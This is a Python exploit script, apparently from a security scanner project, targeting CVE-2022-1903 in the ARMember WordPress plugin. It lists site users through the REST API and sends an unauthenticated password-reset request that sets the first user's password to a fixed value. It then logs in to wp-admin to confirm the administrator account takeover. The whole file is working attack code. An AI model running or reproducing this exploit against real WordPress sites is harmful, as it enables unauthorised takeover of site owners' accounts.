# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-1903

from urllib3.exceptions import InsecureRequestWarning
import requests, json
from termcolor import colored  

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}

def exploit_armember(profile_url, timeout=5):
    """
    Exploit function for ARMember plugin vulnerability (CVE-2022-1903).
    Attempts to exploit an unauthenticated admin account takeover in WordPress.
    """
    session = requests.Session()

    try:
        print(colored(f'[•] Fetching user information from: {profile_url}wp-json/wp/v2/users/', 'yellow'))
        response = session.get(url=profile_url + 'wp-json/wp/v2/users/', headers=headers, allow_redirects=True, verify=False, timeout=timeout)

        if response.status_code != 200:
            print(colored(f'[-] Failed to fetch user data. Status code: {response.status_code}', 'red'))
            return  

        user_data = json.loads(response.text)
        if not user_data:
            print(colored(f'[-] No user data found at {profile_url}', 'red'))
            return False
        
        user_slug = user_data[0]['slug']
        print(colored(f'[•] User found: {user_slug}', 'green'))

        payload = {
            'action': 'arm_shortcode_form_ajax_action',
            'user_pass': 'biulove0x',
            'repeat_pass': 'biulove0x',
            'arm_action': 'change-password',
            'key2': 'x',
            'action2': 'rp',
            'login2': user_slug
        }

        print(colored(f'[•] Attempting password reset for user: {user_slug}', 'yellow'))
        exploit_response = session.post(url=profile_url + 'wp-admin/admin-ajax.php', headers=headers, data=payload, allow_redirects=True, verify=False, timeout=timeout)

        if exploit_response.status_code == 200:
            print(colored(f'[•] Password reset payload delivered successfully!', 'green'))

            login_data = {
                'log': user_slug,
                'pwd': 'biulove0x',
                'wp-submit': 'Login',
                'redirect_to': profile_url + 'wp-admin/',
                'testcookie': 1
            }
            login_response = session.post(url=profile_url + 'wp-login.php', data=login_data, cookies=cookies, allow_redirects=True, verify=False)

            if 'wp-admin/profile.php' in login_response.text:
                print(colored(f'[+] Exploit successful! Logged in as {user_slug}', 'green', attrs=['bold']))
                return True
            else:
                print(colored(f'[-] Exploit failed: Unable to login as {user_slug}', 'red', attrs=['bold']))
                return False
        else:
            print(colored(f'[-] Exploit failed: Payload was not accepted. Status code: {exploit_response.status_code}', 'red'))
            return False

    except Exception as e:
        print(colored(f'[!] Error during exploitation: {e}', 'red'))
        return False

